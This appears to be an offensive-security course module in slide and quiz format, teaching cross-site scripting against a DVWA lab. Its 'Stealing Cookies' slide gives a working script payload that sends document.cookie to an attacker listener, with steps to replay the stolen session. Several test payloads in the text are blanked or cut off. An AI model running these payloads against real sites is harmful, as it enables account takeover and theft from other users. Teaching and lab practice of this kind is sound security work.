title: Cross-Site Scripting (XSS) 🎭
description: Inject client-side scripts to steal cookies and deface websites.

slides.title: What is XSS? 🧬
slides.content:
# JavaScript Injection in the Browser

**Cross-Site Scripting (XSS)** occurs when an attacker injects malicious JavaScript into a web page viewed by other users.

**Analogy**: Imagine a public bulletin board. You post a note that says: *"Free Cookies!"* When someone reads the note, a hidden mechanism gives you their wallet. XSS is the digital equivalent.

**The Goal:**
- **Session Hijacking**: Steal the victim's cookies to impersonate them.
- **Phishing**: Fake login prompts.
- **Defacement**: Change the website's appearance.
- **Keylogging**: Capture keystrokes.

**The Payload**: Usually starts with `<script>alert('XSS')</script>` as a proof of concept.

quizData.question: Who is the typical victim in a Cross-Site Scripting (XSS) attack?

options.text: Another user of the web application.

quizData.explanation: XSS targets other users' browsers, not the server directly.

slides.title: Types of XSS 📊
slides.content:
# Reflected, Stored, and DOM-Based **1. Reflected XSS (Non-Persistent)** - Malicious script is part of the **request** (e.g., URL parameter). - The server **reflects** it back in the response immediately. - **Attack Vector**: Phishing email with a crafted link. - **Example**: `search.php?q=` **2. Stored XSS (Persistent)** - Malicious script is **saved** on the server (e.g., in a database). - Every user who views the infected page gets exploited. - **Attack Vector**: Posting a comment containing the script. - **Impact**: High (worms, mass cookie theft). **3. DOM-Based XSS** - The vulnerability exists in **client-side JavaScript**. - The server never sees the payload; the page's own script mishandles data from the URL hash (`#`) or `document.referrer`. - **Example**: `document.write("

" + location.hash.substring(1) + "

");`

slides.title: Finding XSS Vulnerabilities 🔍
slides.content: # Where to Inject Look for **any input field** that is reflected back on the page: - Search boxes - Comment forms - Profile fields (username, bio) - URL parameters - HTTP Headers (User-Agent, Referer) **Test Payloads:** 1. `` 2. `">` (Break out of HTML attribute). 3. `` (Bypass `

slides.title: Reflected XSS Example 🧪
slides.content: Testing a vulnerable search parameter on DVWA.
slides.codeSnippet: # URL: http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=test # Step 1: Inject basic script http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name= # Step 2: If blocked, try image payload http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name= # Step 3: Steal cookie (requires attacker server) http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=

slides.title: Stealing Cookies (Session Hijacking) 🍪
slides.content:
# Turning XSS into Account Takeover

**Step 1: Setup a listener on Kali**
```bash
python3 -m http.server 8000
```

**Step 2: Inject the payload (Stored XSS in a comment)**
```html
<script>new Image().src="http://192.168.56.102:8000/?c="+document.cookie;</script>
```

**Step 3: Wait for a victim to view the page.**
**Step 4: Check your HTTP server logs.**
```
192.168.56.101 - - [19/Oct/2024 10:00:00] "GET /?c=PHPSESSID=abc123 HTTP/1.1" 200 -
```

**Step 5: Use the stolen cookie in your browser.**
- Open Developer Tools (F12) -> Application -> Cookies.
- Replace your session ID with the stolen one.
- Refresh the page. You are now logged in as the victim!

quizData.question: Which type of XSS affects every user who visits a specific page without requiring them to click a link?
quizData.explanation: Stored XSS is saved on the server and executed whenever the page is loaded.

slides.title: Pro Tip: Bypassing HttpOnly 🚀
slides.content:
## When You Can't Steal Cookies

If the session cookie is marked **HttpOnly**, JavaScript cannot read `document.cookie`.

**Workarounds:**
- **Perform actions on behalf of the user**: Use `fetch()` to make requests from the victim's browser (e.g., change their password, transfer money).
- **Keylogging**: Capture everything they type.
- **Phishing Overlay**: Create a fake login prompt using HTML/CSS.
